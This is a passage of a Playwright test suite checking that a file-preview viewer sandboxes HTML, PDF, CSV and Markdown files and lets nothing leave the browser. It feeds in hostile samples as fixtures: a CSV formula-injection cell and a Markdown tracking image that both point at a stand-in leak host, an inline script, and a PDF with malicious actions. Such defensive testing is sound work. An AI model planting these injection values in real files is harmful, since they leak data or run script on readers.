                page.wait_for_timeout(2500)
                self.assertEqual(TRAP.connections, before, "no connection was opened to a host the nested page names")
                self.assertEqual(outside, [], "nothing left the browser")
                self.assertEqual([frame.url for frame in page.frames if frame != page.main_frame], [f"{ORIGIN}/api/v1/files/{self.ids[f'file:{key}']}/preview"],
                                 "the preview is the only frame: no document was made inside it")
                self.assertEqual(events["pages"], [])

    def test_02b_the_connection_counter_sees_a_connection(self) -> None:
        """Control for test_02: the listener counts a connection this browser does open."""
        context = self.browser.new_context(service_workers="block")
        self.addCleanup(context.close)
        before = TRAP.connections
        try:
            context.new_page().goto(f"{TRAP_URL}/control", timeout=5000)
        except Exception:
            pass
        self.assertGreater(TRAP.connections, before)

    def assert_recorder_sees(self, page: Page, outside: list[str]) -> None:
        """Control: a request that does leave this browser context is recorded, so an empty record means nothing left."""
        control = page.context.new_page()
        try:
            control.goto(f"https://{LEAK}/control")
        except Exception:
            pass
        control.close()
        self.assertEqual(outside, [f"https://{LEAK}/control"])

    def test_03_run_scripts_runs_them_in_an_opaque_origin_that_reaches_nothing(self) -> None:
        page, outside, events = self.open("probe")
        title, url = page.title(), page.url
        _, dialog = self.viewer(page, "probe", "probe.html")
        inside = page.frame_locator(".file-viewer iframe")
        expect(inside.locator("#title")).to_have_text("Script probe")
        expect(inside.locator("#ran")).to_have_count(0)
        self.shot(page, "file-preview-html-scripts-off-1440-light")
        dialog.get_by_role("button", name="Run scripts").click()
        expect(dialog.get_by_role("status")).to_have_text("Scripts are on for this preview. A script may contact the internet. · View source")
        frame = dialog.locator("iframe")
        expect(frame).to_have_attribute("sandbox", "allow-scripts")
        expect(frame).to_have_attribute("src", f"/api/v1/files/{self.ids['file:probe']}/preview?scripts=1")
        expect(inside.locator("#done")).to_have_text("done: yes")
        expect(inside.locator("#ran")).to_have_text("ran: yes")
        expect(inside.locator("#origin")).to_have_text("origin: null")
        expect(inside.locator("#cookie")).to_have_text(re.compile(r"^cookie: blocked SecurityError$"))
        expect(inside.locator("#storage")).to_have_text(re.compile(r"^storage: blocked SecurityError$"))
        expect(inside.locator("#parent")).to_have_text(re.compile(r"^parent: blocked SecurityError$"))
        expect(inside.locator("#api")).to_have_text(re.compile(r"^api: blocked "))
        expect(inside.locator("#fetch")).to_have_text(re.compile(r"^fetch: blocked "))
        expect(inside.locator("#image")).to_have_text("image: blocked")
        expect(inside.locator("#open")).to_have_text("open: got null")
        self.shot(page, "file-preview-html-scripts-on-1440-light")
        page.wait_for_timeout(800)
        self.assertEqual(outside, [], "nothing left the browser")
        self.assertEqual(events["pages"], [])
        self.assertEqual(events["dialogs"], [], "no modal")
        expect(inside.locator("#alert")).to_have_text(re.compile(r"^alert: (returned|blocked)"))
        expect(inside.locator("#form")).to_have_text(re.compile(r"^form: (asked|blocked)"))
        self.assertEqual((page.title(), page.url), (title, url), "top navigation was refused and the Flux page is unchanged")
        # postMessage reaches the parent's window (the browser delivers it), but nothing in Flux listens: the page is unchanged.
        expect(dialog).to_be_visible()
        # Closing turns scripts off again: the next open is still.
        dialog.get_by_role("button", name="Close preview").click()
        _, dialog = self.viewer(page, "probe", "probe.html")
        expect(dialog.locator("iframe")).to_have_attribute("sandbox", "")
        expect(page.frame_locator(".file-viewer iframe").locator("#title")).to_have_text("Script probe")
        expect(page.frame_locator(".file-viewer iframe").locator("#ran")).to_have_count(0)
        self.assertEqual(outside, [])
        self.assert_recorder_sees(page, outside)

    def contents(self, dialog, name: str):
        return dialog.get_by_role("region", name=f"Contents of {name}")

    def test_05_html_view_source_shows_the_markup_as_text(self) -> None:
        page, outside, _ = self.open("report")
        _, dialog = self.viewer(page, "report", "range-report.html")
        dialog.get_by_role("button", name="View source").click()
        source = self.contents(dialog, "range-report.html")
        expect(source).to_contain_text("<h1>LoRa range, far east beds</h1>")
        expect(dialog.locator("iframe")).to_have_count(0)
        expect(source.locator("h1")).to_have_count(0)
        dialog.get_by_role("button", name="Preview", exact=True).click()
        expect(page.frame_locator(".file-viewer iframe").get_by_role("heading", name="LoRa range, far east beds")).to_be_visible()
        self.assertEqual(outside, [])

    def test_06_text_log_and_source_are_monospace_and_wrapped(self) -> None:
        for phone in (False, True):
            for dark in (False, True):
                with self.subTest(phone=phone, dark=dark):
                    page, outside, _ = self.open("log", phone=phone, dark=dark)
                    _, dialog = self.viewer(page, "log", "gateway.log")
                    text = self.contents(dialog, "gateway.log")
                    expect(text).to_contain_text("gateway-3 boot ok")
                    expect(text).to_contain_text("uplink fcnt=1 rssi=-112 snr=-4.5")
                    self.assertIn("Geist Mono", text.evaluate("(el) => getComputedStyle(el).fontFamily"))
                    long = text.locator(".file-viewer__line").nth(3)
                    self.assertGreater(long.bounding_box()["height"], text.locator(".file-viewer__line").first.bounding_box()["height"] * 1.5, "a long line wraps")
                    self.assertLessEqual(long.bounding_box()["width"], text.bounding_box()["width"], "and does not scroll sideways")
                    expect(text.locator(".file-viewer__num")).to_have_count(0)
                    self.shot(page, f"file-preview-text-{'390' if phone else '1440'}-{'dark' if dark else 'light'}")
                    dialog.get_by_role("button", name="Show line numbers").click()
                    expect(text.locator(".file-viewer__num").first).to_have_text("1")
                    dialog.get_by_role("button", name="Hide line numbers").click()
                    expect(text.locator(".file-viewer__num")).to_have_count(0)
                    self.assertEqual(outside, [])
        page, _, _ = self.open("source")
        _, dialog = self.viewer(page, "source", "rssi.py")
        expect(self.contents(dialog, "rssi.py")).to_contain_text("return {b: -112 for b in beds}")
        page, _, _ = self.open("latin")
        _, dialog = self.viewer(page, "latin", "notes.txt")
        expect(self.contents(dialog, "notes.txt")).to_contain_text("Café north bed, 12°C")
        expect(dialog.get_by_role("status")).to_contain_text("Shown as Windows-1252 text.")

    def test_07_json_is_pretty_and_folds_and_invalid_json_says_where(self) -> None:
        for phone in (False, True):
            for dark in (False, True):
                with self.subTest(phone=phone, dark=dark):
                    page, outside, _ = self.open("json", phone=phone, dark=dark)
                    _, dialog = self.viewer(page, "json", "beds.json")
                    tree = self.contents(dialog, "beds.json")
                    expect(tree.locator(".file-viewer__line").nth(1)).to_have_text('"gateway": "gw-3",')
                    expect(tree).to_contain_text('"name": "far east",')
                    self.shot(page, f"file-preview-json-{'390' if phone else '1440'}-{'dark' if dark else 'light'}")
                    beds = tree.locator(".file-viewer__line").nth(2)
                    expect(beds).to_have_text('"beds": [')
                    beds.get_by_role("button", name="Fold").click()
                    expect(tree.locator(".file-viewer__line").nth(2)).to_have_text('"beds": [ … 2 items ],')
                    expect(tree).not_to_contain_text("far east")
                    tree.locator(".file-viewer__line").nth(2).get_by_role("button", name="Unfold").click()
                    expect(tree).to_contain_text('"name": "far east",')
                    self.assertEqual(outside, [])
        page, _, _ = self.open("bad")
        _, dialog = self.viewer(page, "bad", "broken.json")
        expect(dialog.get_by_role("alert")).to_have_text("Not valid JSON: line 3, column 17: Unexpected \",\".")
        expect(self.contents(dialog, "broken.json")).to_contain_text('"beds": [1, 2,, 3]')
        self.shot(page, "file-preview-json-invalid-1440-light")

    def test_08_csv_and_tsv_are_tables_whose_formulas_stay_text(self) -> None:
        for phone in (False, True):
            for dark in (False, True):
                with self.subTest(phone=phone, dark=dark):
                    page, outside, _ = self.open("csv", phone=phone, dark=dark)
                    _, dialog = self.viewer(page, "csv", "range.csv")
                    table = dialog.get_by_role("table", name="Contents of range.csv")
                    expect(table.get_by_role("columnheader")).to_have_text(["bed", "rssi", "note"])
                    expect(table.get_by_role("cell", name="behind the hedge, low")).to_be_visible()
                    formula = table.get_by_role("cell", name='=HYPERLINK("https://leak.invalid/x","click")')
                    expect(formula).to_be_visible()
                    expect(table.get_by_role("cell", name="@SUM(1+1)")).to_be_visible()
                    expect(table.get_by_role("cell", name="-2+3")).to_be_visible()
                    expect(table.get_by_role("link")).to_have_count(0)
                    expect(dialog.get_by_role("status")).to_have_text("4 rows")
                    # A wide table scrolls inside its sheet: the viewer keeps the screen's width.
                    self.assertLessEqual(page.evaluate("document.querySelector('.file-viewer').scrollWidth"), page.viewport_size["width"])
                    self.assertLessEqual(dialog.locator(".photo-viewer__top").bounding_box()["width"], page.viewport_size["width"])
                    self.shot(page, f"file-preview-csv-{'390' if phone else '1440'}-{'dark' if dark else 'light'}")
                    self.assertEqual(outside, [])
        page, _, _ = self.open("tsv")
        _, dialog = self.viewer(page, "tsv", "range.tsv")
        table = dialog.get_by_role("table", name="Contents of range.tsv")
        expect(table.get_by_role("columnheader")).to_have_text(["bed", "rssi"])
        expect(table.get_by_role("cell", name="-112")).to_be_visible()

    def pdf_viewer(self, page: Page, key: str, name: str):
        """The viewer's dialog, the locator of its frame and the frame itself, once the first page is drawn."""
        _, dialog = self.viewer(page, key, name)
        inside = page.frame_locator(".file-viewer iframe")
        expect(inside.locator(".page canvas").first).to_be_attached()
        expect(dialog.locator(".file-viewer__cover")).to_have_count(0)
        return dialog, inside, next(f for f in page.frames if f.url.endswith("/pdf-viewer/index.html"))

    def test_09_a_pdf_is_drawn_by_flux_in_a_sandboxed_frame_never_by_the_browsers_viewer(self) -> None:
        for phone in (False, True):
            with self.subTest(phone=phone):
                page, outside, events = self.open("pdf", phone=phone)
                title, url = page.title(), page.url
                dialog, inside, frame = self.pdf_viewer(page, "pdf", "placement.pdf")
                expect(dialog.locator("iframe")).to_have_attribute("src", "/pdf-viewer/index.html")
                expect(dialog.locator("iframe")).to_have_attribute("sandbox", "allow-scripts")
                expect(inside.locator(".textLayer").first).to_contain_text("Gateway placement")
                self.assertEqual(frame.evaluate("self.origin"), "null", "an opaque origin")
                ink = frame.evaluate("""() => { const c = document.querySelector('.page canvas'); const d = c.getContext('2d').getImageData(0, 0, c.width, c.height).data;
                    let n = 0; for (let i = 0; i < d.length; i += 4) if (d[i] < 128) n++; return n; }""")
                self.assertGreater(ink, 500, "the page's text is drawn")
                self.assertTrue(all(f.url.startswith(("http://", "https://")) or f.url == "about:blank" for f in page.frames), [f.url for f in page.frames])
                self.assertEqual(outside, [], "nothing left the browser")
                self.assertEqual((page.title(), page.url, events["pages"], events["dialogs"]), (title, url, [], []))
                self.shot(page, f"file-preview-pdf-{'390' if phone else '1440'}-light")

    def test_09a_the_audits_page_sized_link_never_takes_the_flux_tab(self) -> None:
        self.assert_page_sized_link_stays_in_flux(self.browser, native_viewer=False)

    @unittest.skipUnless(UI_BROWSER == "chromium", "the full Chromium build carries the PDF viewer the audit used")
    def test_09b_the_audits_page_sized_link_in_the_full_chromium_build(self) -> None:
        full = self.pw.chromium.launch(channel="chromium")
        self.addCleanup(full.close)
        self.assert_page_sized_link_stays_in_flux(full, native_viewer=True)

    def assert_page_sized_link_stays_in_flux(self, browser: Browser, native_viewer: bool) -> None:
        """#1350: a link annotation as large as the page. Pressing anywhere on the document used to replace the whole Flux tab in Chromium."""
        page, outside, events = self.open("biglink", browser=browser)
        title, url = page.title(), page.url
        if native_viewer:
            self.assertTrue(page.evaluate("navigator.pdfViewerEnabled"), "this build has the PDF viewer the audit clicked in, which Flux does not use")
        dialog, inside, frame = self.pdf_viewer(page, "biglink", "biglink.pdf")
        self.assertFalse([f.url for f in page.frames if f.url.startswith("chrome-extension://")], "the browser's own PDF viewer is not in the page")
        expect(inside.locator(".links button")).to_have_count(1)
        box = dialog.locator("iframe").bounding_box()
        assert box is not None
        note = dialog.get_by_text(f"This PDF links to {PDF_LINK}")
        for x, y in ((0.5, 0.5), (0.35, 0.3), (0.62, 0.45)):
            page.mouse.click(box["x"] + box["width"] * x, box["y"] + box["height"] * y)
            expect(note).to_be_visible()
            page.wait_for_timeout(400)
            self.assertEqual((page.url, page.title()), (url, title), "the Flux tab stays where it was")
            self.assertEqual([f.url for f in page.frames if f != page.main_frame], [f"{ORIGIN}/pdf-viewer/index.html"], "no frame was navigated")
            self.assertEqual(outside, [], "nothing is fetched before the person presses Open link")
            self.assertEqual(events["pages"], [], "no tab opened by itself")
            dialog.get_by_role("button", name="Dismiss").click()
            expect(note).to_have_count(0)
        # The keyboard presses it too.
        inside.locator(".links button").focus()
        page.keyboard.press("Enter")
        expect(note).to_be_visible()
        # Open link is an ordinary anchor to a new tab, without Flux's page as its opener and without a referrer.
        anchor = dialog.get_by_role("link", name="Open link")
        expect(anchor).to_have_attribute("href", PDF_LINK)
        expect(anchor).to_have_attribute("target", "_blank")
        expect(anchor).to_have_attribute("rel", "noopener noreferrer")
        with page.context.expect_page() as opened:
            anchor.click()
        self.assertIsNone(opened.value.opener(), "the new tab has no opener")
        deadline = time.time() + 10
        while time.time() < deadline and not outside:
            page.wait_for_timeout(100)
        self.assertEqual(outside, [PDF_LINK], "only now did the address leave, as a new tab")
        self.assertEqual((page.url, page.title()), (url, title))
        expect(dialog).to_be_visible()

    def test_09c_a_hostile_pdf_can_do_nothing_but_offer_its_one_honest_link(self) -> None:
        before = TRAP.connections
        page, outside, events = self.open("hostile-pdf")
        title, url = page.title(), page.url
        dialog, inside, _ = self.pdf_viewer(page, "hostile-pdf", "hostile.pdf")
        expect(inside.locator(".textLayer").first).to_contain_text("Hostile links")
        # Scripts, every scheme but http(s), Launch, another file, a form and an address with a password: no button at all.
        self.assertEqual(inside.locator(".links button").evaluate_all("(buttons) => buttons.map((b) => b.getAttribute('aria-label'))"), [f"Link to https://{LEAK}/legit"])
        self.assertEqual(inside.locator("a, form, input, iframe, object, embed").count(), 0, "nothing in the viewer could navigate")
        inside.locator(".links button").click()
        expect(dialog.get_by_text(f"This PDF links to https://{LEAK}/legit")).to_be_visible()
        page.wait_for_timeout(2500)  # past any action the file ran on open
        self.assertEqual(outside, [], "nothing left the browser")
        self.assertEqual(TRAP.connections, before)
        self.assertEqual((events["pages"], events["downloads"], events["dialogs"]), ([], [], []), "the file's script never ran")
        self.assertEqual([json.loads(m)["type"] for m in page.evaluate("window.__messages")], ["ready", "drawn", "link"], "the viewer said only that it was ready, drew, and the one link")
        self.assertEqual((page.url, page.title()), (url, title))

    def test_09d_links_to_a_place_in_the_pdf_scroll_the_viewer_and_say_nothing(self) -> None:
        page, outside, events = self.open("goto")
        title, url = page.title(), page.url
        dialog, inside, frame = self.pdf_viewer(page, "goto", "goto.pdf")
        buttons = inside.locator(".page").first.locator(".links button")
        expect(buttons).to_have_count(4)
        top = lambda index: frame.evaluate("(i) => document.querySelectorAll('.page')[i].getBoundingClientRect().top", index)  # noqa: E731
        scroll = lambda: frame.evaluate("document.getElementById('scroller').scrollTop")  # noqa: E731
        to_top = lambda: frame.evaluate("document.getElementById('scroller').scrollTop = 0")  # noqa: E731
        self.assertEqual(scroll(), 0)
        buttons.nth(0).click()  # page two, a point down it
        expect(inside.locator(".page").nth(1).locator(".textLayer")).to_contain_text("Page two")
        self.assertTrue(-300 < top(1) < -50, top(1))
        to_top()
        buttons.nth(2).click()  # a named destination: page three
        expect(inside.locator(".page").nth(2).locator(".textLayer")).to_contain_text("Page three")
        self.assertTrue(0 <= top(2) < 300, top(2))
        to_top()
        buttons.nth(3).click()  # the last-page action
        expect(inside.locator(".page").nth(2).locator(".textLayer")).to_contain_text("Page three")
        self.assertTrue(0 <= top(2) < 300, top(2))
        frame.evaluate("document.getElementById('scroller').scrollTop = document.querySelectorAll('.page')[1].offsetTop - 12")
        inside.locator(".page").nth(1).locator(".links button").click()  # the first-page action
        expect(inside.locator(".page").first.locator(".textLayer")).to_contain_text("Page one")
        self.assertEqual(scroll(), 0)
        page.wait_for_timeout(600)
        self.assertEqual(dialog.get_by_text("This PDF links to").count(), 0, "a place in the file needs no confirmation")
        self.assertEqual([json.loads(m)["type"] for m in page.evaluate("window.__messages")], ["ready", "drawn"], "and the viewer said nothing to Flux")
        self.assertEqual((outside, events["pages"], page.url, page.title()), ([], [], url, title))

    def test_09e_pages_are_drawn_only_near_the_view(self) -> None:
        page, outside, _ = self.open("long-pdf")
        _, inside, frame = self.pdf_viewer(page, "long-pdf", "long.pdf")
        drawn = "() => [...document.querySelectorAll('.page')].map((p, i) => p.querySelector('canvas').width > 0 ? i : -1).filter((i) => i >= 0)"
        expect(inside.locator(".page")).to_have_count(40)
        page.wait_for_timeout(800)
        first = frame.evaluate(drawn)
        self.assertTrue(0 in first and len(first) <= 8, f"only the first pages are drawn: {first}")
        frame.evaluate("document.getElementById('scroller').scrollTop = document.getElementById('scroller').scrollHeight")
        expect(inside.locator(".page").nth(39).locator(".textLayer")).to_contain_text("Page 40")
        page.wait_for_timeout(800)
        last = frame.evaluate(drawn)
        self.assertTrue(39 in last and 0 not in last and len(last) <= 8, f"the pages left behind are released: {last}")
        self.assertEqual(outside, [])

    def test_09f_a_file_that_is_not_a_pdf_says_so_and_is_never_drawn_as_a_page(self) -> None:
        page, outside, events = self.open("not-pdf")
        _, dialog = self.viewer(page, "not-pdf", "html-named.pdf")
        expect(dialog.get_by_text("This file could not be shown. Download it to open it.")).to_be_visible()
        expect(dialog.get_by_role("link", name="Download")).to_have_attribute("download", "html-named.pdf")
        page.wait_for_timeout(800)
        self.assertEqual((outside, events["pages"], events["dialogs"]), ([], [], []))
        self.assertEqual([json.loads(m)["type"] for m in page.evaluate("window.__messages")], ["ready", "failed"], "its script never ran")

    @unittest.skipUnless(UI_BROWSER == "chromium", "long tasks are measured in Chromium")
    def test_11_five_mib_files_open_without_holding_the_page(self) -> None:
        """A 5 MiB log, CSV (about 100,000 rows, scrolled to its last row) and JSON: no main-thread task over 200 ms."""
        for key, name in (("big-log", "uplinks.log"), ("big-csv", "uplinks.csv"), ("big-json", "uplinks.json")):
            with self.subTest(file=name):
                page, _, _ = self.open(key)
                page.evaluate("() => { window.__long = []; new PerformanceObserver((list) => { for (const e of list.getEntries()) window.__long.push(Math.round(e.duration)); }).observe({ type: 'longtask' }); }")
                started = time.time()
                _, dialog = self.viewer(page, key, name)
                if key == "big-csv":
                    table = dialog.get_by_role("table", name=f"Contents of {name}")
                    expect(table.get_by_role("columnheader").first).to_have_text("time", timeout=20000)
                    expect(dialog.get_by_role("status")).to_have_text(f"{BIG_CSV_ROWS:,} rows")
                    for _ in range(3):
                        table.evaluate("(el) => { el.scrollTop = el.scrollHeight; }")
                        page.wait_for_timeout(200)
                    last = BIG_CSV.rstrip(b"\n").rsplit(b"\n", 1)[1].decode().split(",")
                    row = table.locator(f"[role=row][aria-rowindex='{BIG_CSV_ROWS + 1}']")
                    expect(row).to_be_visible()
                    expect(row.get_by_role("cell").first).to_have_text(last[0])
                    expect(table.get_by_role("columnheader").first).to_be_in_viewport()
                    self.assertLess(table.locator("[role=row]").count(), 200, "only the rows in view are in the page")
                else:
                    region = self.contents(dialog, name)
                    expect(region.locator(".file-viewer__line").first).to_be_visible(timeout=20000)
                    region.evaluate("(el) => { el.scrollTop = el.scrollHeight / 2; }")
                    page.wait_for_timeout(300)
                    self.assertLess(region.locator(".file-viewer__line").count(), 400, "only the lines in view are in the page")
                ready = time.time() - started
                page.wait_for_timeout(300)
                long = page.evaluate("window.__long")
                print(f"{name}: ready in {ready:.2f} s, long tasks {long}")
                self.assertTrue(all(duration <= 200 for duration in long), f"{name}: long tasks {long}")
                self.shot(page, f"file-preview-{key}-1440-light")
        # Markdown of 4 MiB on one line is cut into small chunks: only those in view are drawn.
        with self.subTest(file="one-line.md"):
            page, _, _ = self.open("one-line")
            page.evaluate("() => { window.__long = []; new PerformanceObserver((list) => { for (const e of list.getEntries()) window.__long.push(Math.round(e.duration)); }).observe({ type: 'longtask' }); }")
            started = time.time()
            _, dialog = self.viewer(page, "one-line", "one-line.md")
            doc = self.contents(dialog, "one-line.md")
            expect(doc.locator("em").first).to_have_text("a", timeout=20000)
            doc.evaluate("(el) => { el.scrollTop = el.scrollHeight / 2; }")
            page.wait_for_timeout(800)
            self.assertLess(doc.locator("em").count(), 20_000, "only the chunks near the view are drawn")
            long = page.evaluate("window.__long")
            print(f"one-line.md: ready in {time.time() - started:.2f} s, long tasks {long}")
            self.assertTrue(all(duration <= 200 for duration in long), f"one-line.md: long tasks {long}")
        # A table as wide as a file allows draws its first 200 columns and says so: no column holds the page either.
        for key, name, columns in (("commas", "commas.csv", len(COMMAS) + 1), ("wide", "matrix.csv", 2000)):
            with self.subTest(file=name):
                page, _, _ = self.open(key)
                page.evaluate("() => { window.__long = []; new PerformanceObserver((list) => { for (const e of list.getEntries()) window.__long.push(Math.round(e.duration)); }).observe({ type: 'longtask' }); }")
                started = time.time()
                _, dialog = self.viewer(page, key, name)
                table = dialog.get_by_role("table", name=f"Contents of {name}")
                expect(table.get_by_role("columnheader")).to_have_count(200, timeout=30000)
                expect(table).to_have_attribute("aria-colcount", str(columns))
                expect(dialog.get_by_role("status")).to_contain_text(f"Showing the first 200 of {columns:,} columns. Download to see them all.")
                table.evaluate("(el) => { el.scrollLeft = el.scrollWidth; el.scrollTop = el.scrollHeight; }")
                page.wait_for_timeout(500)
                self.assertLess(table.locator("[role=row]").count(), 60, "only the rows in view and a few beyond are drawn")
                long = page.evaluate("window.__long")
                print(f"{name}: ready in {time.time() - started:.2f} s, long tasks {long}")
                self.assertTrue(all(duration <= 200 for duration in long), f"{name}: long tasks {long}")

    def test_12_markdown_is_drawn_by_the_message_renderer_and_loads_nothing(self) -> None:
        for phone in (False, True):
            for dark in (False, True):
                with self.subTest(phone=phone, dark=dark):
                    page, outside, _ = self.open("markdown", phone=phone, dark=dark)
                    _, dialog = self.viewer(page, "markdown", "notes.md")
                    doc = self.contents(dialog, "notes.md")
                    expect(doc.locator("strong")).to_have_text("sensor 3")
                    expect(doc.locator("em")).to_have_text("post")
                    expect(doc.get_by_role("listitem")).to_have_text(["far east: -112 dBm", "north: -98 dBm"])
                    link = doc.get_by_role("link", name="https://example.org/garden-guide")
                    expect(link).to_have_attribute("target", "_blank")
                    expect(link).to_have_attribute("rel", re.compile(r"\bnoopener\b"))
                    # HTML and an image stay as typed: nothing runs and nothing loads.
                    expect(doc).to_contain_text("<script>parent.postMessage('markdown', '*')</script>")
                    expect(doc).to_contain_text("![pixel](https://leak.invalid/md.png)")
                    expect(doc.locator("img, script, iframe")).to_have_count(0)
                    self.shot(page, f"file-preview-markdown-{'390' if phone else '1440'}-{'dark' if dark else 'light'}")
                    dialog.get_by_role("button", name="View source").click()
                    expect(self.contents(dialog, "notes.md")).to_contain_text("Mount **sensor 3** on the *post*")
                    expect(self.contents(dialog, "notes.md").locator("strong")).to_have_count(0)
                    dialog.get_by_role("button", name="Preview", exact=True).click()
                    expect(self.contents(dialog, "notes.md").locator("strong")).to_have_text("sensor 3")
                    page.wait_for_timeout(300)
                    self.assertEqual(page.evaluate("window.__messages"), [])
                    self.assertEqual(outside, [])

    def test_99_a_reader_who_lost_access_sees_nothing(self) -> None:
        page, outside, _ = self.open("report", quiet_stream=True)
        message = page.locator(f"#message-{self.ids['report']}")
        context = self.browser.new_context(base_url=ORIGIN, storage_state=self.states["ada"], service_workers="block")
        self.addCleanup(context.close)
        removed = context.request.delete(f"/api/v1/projects/{self.ids['project']}/grants/{self.ids['grant']}", headers={"origin": ORIGIN})
        self.assertEqual(removed.status, 204, removed.text())
        self.addCleanup(lambda: context.request.post(f"/api/v1/projects/{self.ids['project']}/grants", headers={"origin": ORIGIN},
                                                     data={"principal": {"kind": "human", "id": self.ids["jonas"]}, "role": "contributor"}))
        message.get_by_role("button", name="Preview range-report.html").click()
        dialog = page.get_by_role("dialog", name="range-report.html")
        expect(dialog.get_by_role("alert")).to_have_text("You no longer have access to this file.")
        expect(dialog.locator("iframe")).to_have_count(0)
        self.assertEqual(outside, [])


if __name__ == "__main__":
    unittest.main()
